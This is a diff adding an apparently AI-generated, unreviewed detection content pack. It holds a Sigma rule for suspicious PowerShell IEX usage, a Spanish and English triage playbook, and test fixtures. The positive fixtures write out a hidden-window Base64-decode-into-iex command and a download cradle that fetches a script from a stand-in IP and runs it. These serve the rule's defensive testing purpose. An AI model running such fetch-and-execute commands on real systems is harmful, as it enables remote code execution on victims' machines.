@@ -1,0 +1,126 @@
+{
+  "rule": {
+    "id": "09576804-7a05-458e-a817-eb718ca91f54",
+    "title": "Suspicious PowerShell IEX Execution Patterns",
+    "level": "high",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_powershell_iex_patterns.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_powershell_iex_patterns.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "PowerShell ejecutó código con el alias IEX (Invoke-Expression) usando un patrón típico de cargas ofuscadas o descargadas, a menudo un payload en Base64 decodificado en memoria.",
+      "what_it_detects": "Creación de procesos powershell.exe o pwsh.exe cuya CommandLine envía datos a IEX mediante pipe (' | iex;', ' | IEX (new', ');IEX ') y además decodifica Base64 (::FromBase64String, .GetString([System.Convert]::), o bien patrones independientes como ');iex($', ')|iex;$' o ' | IEX | '.",
+      "why_it_matters": "Invoke-Expression ejecuta texto arbitrario como código, lo que permite correr scripts descargados u ofuscados sin escribirlos en disco (ATT&CK T1059.001, PowerShell). Es una técnica frecuente en accesos iniciales y post-explotación.",
+      "triage_steps": [
+        "Lea la CommandLine completa; decodifique cualquier cadena Base64 en un entorno aislado (por ejemplo CyberChef) e identifique URLs, IPs o comandos del payload.",
+        "Revise ParentImage y la cadena de procesos padre: Office, navegadores, wscript, mshta, servicios web o herramientas de acceso remoto aumentan la sospecha.",
+        "Identifique el usuario y el host; confirme si el usuario suele ejecutar PowerShell y si el equipo es una estación o un servidor expuesto.",
+        "Busque en el mismo host, +/- 15 minutos, procesos hijos, conexiones de red salientes, descargas de archivos y creación de tareas programadas o servicios.",
+        "Consulte los logs de PowerShell Script Block (Event ID 4104) para ver el código desofuscado que realmente se ejecutó.",
+        "Pivotee por el hash, las URLs o IPs encontradas y la misma CommandLine en otros hosts, y revise alertas previas para el mismo usuario o equipo."
+      ],
+      "false_positives": [
+        "Scripts legítimos de administración o instalación que usan IEX para cargar módulos o configuraciones.",
+        "Instaladores conocidos (por ejemplo, bootstrap de gestores de paquetes) que descargan y ejecutan un script con IEX.",
+        "Herramientas de gestión de endpoints o RMM que envían comandos codificados en Base64."
+      ],
+      "response_steps": [
+        "Verifique con el propietario del sistema o el equipo de TI si la ejecución fue autorizada antes de actuar.",
+        "Si es maliciosa, aísle el endpoint desde el EDR y bloquee las URLs, dominios o IPs identificados en el payload.",
+        "Termine los procesos relacionados, elimine la persistencia encontrada y restablezca las credenciales del usuario afectado.",
+        "Recolecte evidencia (memoria, logs 4104, artefactos) y busque la misma actividad en el resto del entorno.",
+        "Restaure el equipo a un estado confiable y documente exclusiones solo para scripts legítimos verificados."
+      ],
+      "severity_rationale": "El nivel alto es adecuado porque ejecutar con IEX código decodificado o descargado es una señal fuerte de actividad maliciosa, y su uso legítimo es poco común."
+    },
+    "en": {
+      "summary": "PowerShell ran code through the IEX (Invoke-Expression) alias using a pattern typical of obfuscated or downloaded payloads, often a Base64 blob decoded in memory.",
+      "what_it_detects": "powershell.exe or pwsh.exe process creation where CommandLine pipes data into IEX (' | iex;', ' | IEX (new', ');IEX ') together with Base64 decoding (::FromBase64String, .GetString([System.Convert]::), or standalone patterns such as ');iex($', ')|iex;$' or ' | IEX | '.",
+      "why_it_matters": "Invoke-Expression runs arbitrary text as code, letting attackers execute downloaded or obfuscated scripts without writing them to disk (ATT&CK T1059.001, PowerShell). It is common in initial access and post-exploitation.",
+      "triage_steps": [
+        "Read the full CommandLine; decode any Base64 string in a sandbox (for example CyberChef) and extract URLs, IPs or commands from the payload.",
+        "Check ParentImage and the parent chain: Office, browsers, wscript, mshta, web server processes or remote access tools raise suspicion.",
+        "Identify the user and host; confirm whether this user normally runs PowerShell and whether the host is a workstation or an exposed server.",
+        "On the same host within +/- 15 minutes, look for child processes, outbound connections, file downloads, and new scheduled tasks or services.",
+        "Review PowerShell Script Block logs (Event ID 4104) to see the deobfuscated code that actually ran.",
+        "Pivot on hashes, extracted URLs or IPs, and the same CommandLine across other hosts; check earlier alerts for this user or host."
+      ],
+      "false_positives": [
+        "Legitimate admin or installation scripts that use IEX to load modules or configuration.",
+        "Known installers (for example package manager bootstrap scripts) that download and run a script with IEX.",
+        "Endpoint management or RMM tools that push Base64-encoded commands."
+      ],
+      "response_steps": [
+        "Confirm with the system owner or IT whether the execution was authorized before acting.",
+        "If malicious, isolate the endpoint via EDR and block the URLs, domains or IPs found in the payload.",
+        "Kill related processes, remove any persistence found and reset the affected user's credentials.",
+        "Collect evidence (memory, 4104 logs, artifacts) and hunt for the same activity across the environment.",
+        "Restore the host to a trusted state and add exclusions only for verified legitimate scripts."
+      ],
+      "severity_rationale": "High fits because running decoded or downloaded code via IEX is a strong indicator of malicious activity and is rarely needed legitimately."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "PowerShell decodes a Base64 string and pipes it into IEX (selection_combined_1 and selection_combined_2).",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "powershell.exe -NoP -W Hidden -c \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V3JpdGUtSG9zdCAndGVzdCc=')) | iex; exit\""
+        }
+      },
+      {
+        "description": "Download cradle storing content in a variable and running it with iex($ (selection_standalone).",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP-03.andes.example.com",
+          "User": "ANDES\\svc_web",
+          "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+          "ParentImage": "C:\\Windows\\System32\\w3wp.exe",
+          "CommandLine": "pwsh.exe -c \"$d=(New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1');iex($d)\""
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Admin pipes a local script into IEX without any Base64 decoding; only selection_combined_1 matches.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "powershell.exe -c \"Get-Content .\\setup.ps1 -Raw | iex; Write-Host done\""
+        }
+      },
+      {
+        "description": "Base64 decoding written to a file, no IEX involved; only selection_combined_2 matches.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "powershell.exe -c \"[System.Convert]::FromBase64String('SGVsbG8=') | Set-Content -Path C:\\Temp\\out.bin -Encoding Byte\""
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
